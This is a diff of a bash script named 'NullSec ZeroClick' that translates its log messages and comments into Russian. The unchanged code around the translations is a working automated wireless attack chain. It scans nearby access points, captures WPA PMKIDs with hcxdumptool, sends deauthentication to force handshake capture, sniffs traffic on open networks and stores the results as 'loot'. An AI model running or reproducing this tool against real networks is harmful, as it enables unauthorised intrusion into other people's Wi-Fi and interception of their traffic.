@@ -39,19 +39,19 @@ trap cleanup INT TERM
 
 log "=========================================="
 log "   NullSec ZeroClick v1.0"
-log "   Automated Attack Chain"
+log "   Автоматическая цепь атак"
 log "=========================================="
-log "[*] Режим: $ATTACK_MODE"
+log "[*] Режим работы: $ATTACK_MODE"
 
 # Phase 1: Recon
 log ""
-log "[PHASE 1] Reconnaissance"
+log "[ФАЗА 1] Разведка"
 log "=========================================="
 
 airmon-ng start wlan1 2>/dev/null
 sleep 2
 
-log "[*] Scanning for targets (30 seconds)..."
+log "[*] Сканирование целей (30 секунд)..."
 timeout 30 airodump-ng "$MONITOR_INTERFACE" --write "$LOOT_DIR/recon/scan" --output-format csv 2>/dev/null
 sleep 2
 
@@ -60,15 +60,15 @@ if [ -f "$LOOT_DIR/recon/scan-01.csv" ]; then
     # Get APs with clients (high value targets)
     TARGETS=$(grep -E "^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" "$LOOT_DIR/recon/scan-01.csv" 2>/dev/null | head -10)
     TARGET_COUNT=$(echo "$TARGETS" | grep -c ":")
-    log "[+] Найдено $TARGET_COUNT potential targets"
+    log "[+] Найдено $TARGET_COUNT потенциальных целей"
 else
-    log "[!] No scan results, retrying..."
+    log "[!] Нет результатов сканирования, повторяю..."
     exit 1
 fi
 
-# Phase 2: Target Analysis
+# Фаза 2: Анализ целей
 log ""
-log "[PHASE 2] Target Analysis"
+log "[ФАЗА 2] Анализ целей"
 log "=========================================="
 
 echo "$TARGETS" | while IFS=',' read -r BSSID FIRST_SEEN LAST_SEEN CHANNEL SPEED PRIVACY CIPHER AUTH POWER BEACONS IV LANIP IDLEN ESSID KEY; do
@@ -81,50 +81,50 @@ echo "$TARGETS" | while IFS=',' read -r BSSID FIRST_SEEN LAST_SEEN CHANNEL SPEED
     [ -z "$BSSID" ] && continue
     [ "$BSSID" = "BSSID" ] && continue
     
-    log "[*] Analyzing: $ESSID ($BSSID)"
-    log "    Channel: $CHANNEL | Security: $PRIVACY | Signal: ${POWER}dBm"
+    log "[*] Анализирую: $ESSID ($BSSID)"
+    log "    Канал: $CHANNEL | Безопасность: $PRIVACY | Сигнал: ${POWER}dBm"
     
-    # Determine attack vector
+    # Определение вектора атаки
     case "$PRIVACY" in
         *WPA2*|*WPA*)
-            log "    [>] Attack vector: PMKID + Handshake capture"
+            log "    [>] Вектор атаки: PMKID + захват handshake"
             ATTACK_TYPE="wpa"
             ;;
         *WEP*)
-            log "    [>] Attack vector: WEP crack (legacy)"
+            log "    [>] Вектор атаки: Взлом WEP (устаревший)"
             ATTACK_TYPE="wep"
             ;;
         *OPN*|*OPEN*)
-            log "    [>] Attack vector: Traffic sniffing"
+            log "    [>] Вектор атаки: Перехват трафика"
             ATTACK_TYPE="open"
             ;;
         *)
-            log "    [>] Unknown security, skipping"
+            log "    [>] Неизвестная безопасность, пропускаю"
             continue
             ;;
     esac
     
-    # Phase 3: Automated Attack
+    # Фаза 3: Автоматическая атака
     if [ "$ATTACK_MODE" != "passive" ]; then
         log ""
-        log "[PHASE 3] Attacking: $ESSID"
+        log "[ФАЗА 3] Атака: $ESSID"
         log "=========================================="
         
-        # Set channel
+        # Установка канала
         iwconfig "$MONITOR_INTERFACE" channel "$CHANNEL" 2>/dev/null
         
         if [ "$ATTACK_TYPE" = "wpa" ]; then
-            # Try PMKID first (clientless)
-            log "[*] Attempting PMKID capture..."
+            # Попытка захвата PMKID (без клиента)
+            log "[*] Попытка захвата PMKID..."
             timeout 20 hcxdumptool -i "$MONITOR_INTERFACE" -o "$LOOT_DIR/pmkid/${ESSID}_pmkid.pcapng" --filtermode=2 --filterlist_ap="$BSSID" 2>/dev/null
             
             if [ -f "$LOOT_DIR/pmkid/${ESSID}_pmkid.pcapng" ]; then
-                log "[+] PMKID capture attempt complete"
+                log "[+] Попытка захвата PMKID завершена"
             fi
             
-            # Deauth for handshake
+            # Деаутентификация для handshake
             if [ "$ATTACK_MODE" = "aggressive" ]; then
-                log "[*] Sending deauth for handshake capture..."
+                log "[*] Отправляю деаут для захвата handshake..."
                 airodump-ng "$MONITOR_INTERFACE" -c "$CHANNEL" --bssid "$BSSID" --write "$LOOT_DIR/handshakes/$ESSID" --output-format pcap 2>/dev/null &
                 DUMP_PID=$!
                 sleep 3
@@ -134,31 +134,31 @@ echo "$TARGETS" | while IFS=',' read -r BSSID FIRST_SEEN LAST_SEEN CHANNEL SPEED
                 
                 kill $DUMP_PID 2>/dev/null
                 
-                # Check for handshake
+                # Проверка handshake
                 if aircrack-ng "$LOOT_DIR/handshakes/${ESSID}-01.cap" 2>/dev/null | grep -q "1 handshake"; then
-                    log "[+] HANDSHAKE CAPTURED for $ESSID!"
+                    log "[+] HANDSHAKE ПЕРЕХВАЧЕН для $ESSID!"
                     echo "$BSSID,$ESSID,$CHANNEL,$(date)" >> "$LOOT_DIR/captured_handshakes.csv"
                 fi
             fi
             
         elif [ "$ATTACK_TYPE" = "open" ]; then
-            log "[*] Capturing traffic from open network..."
+            log "[*] Перехват трафика из открытой сети..."
             timeout 30 tcpdump -i "$MONITOR_INTERFACE" -w "$LOOT_DIR/recon/${ESSID}_traffic.pcap" 2>/dev/null
         fi
     fi
     
 done
 
-# Phase 4: Report
+# Фаза 4: Отчет
 log ""
-log "[PHASE 4] Attack Summary"
+log "[ФАЗА 4] Итоги атаки"
 log "=========================================="
-log "[*] Targets scanned: $TARGET_COUNT"
-log "[*] PMKID captures: $(ls -1 $LOOT_DIR/pmkid/*.pcapng 2>/dev/null | wc -l)"
+log "[*] Отсканировано целей: $TARGET_COUNT"
+log "[*] Захвачено PMKID: $(ls -1 $LOOT_DIR/pmkid/*.pcapng 2>/dev/null | wc -l)"
 log "[*] Handshakes: $(ls -1 $LOOT_DIR/handshakes/*.cap 2>/dev/null | wc -l)"
-log "[*] Traffic captures: $(ls -1 $LOOT_DIR/recon/*.pcap 2>/dev/null | wc -l)"
+log "[*] Захвачено трафика: $(ls -1 $LOOT_DIR/recon/*.pcap 2>/dev/null | wc -l)"
 log ""
-log "[+] ZeroClick attack chain complete"
-log "[*] All loot saved to: $LOOT_DIR"
+log "[+] Цепь атак ZeroClick завершена"
+log "[*] Весь трофей сохранён в: $LOOT_DIR"
 
 cleanup
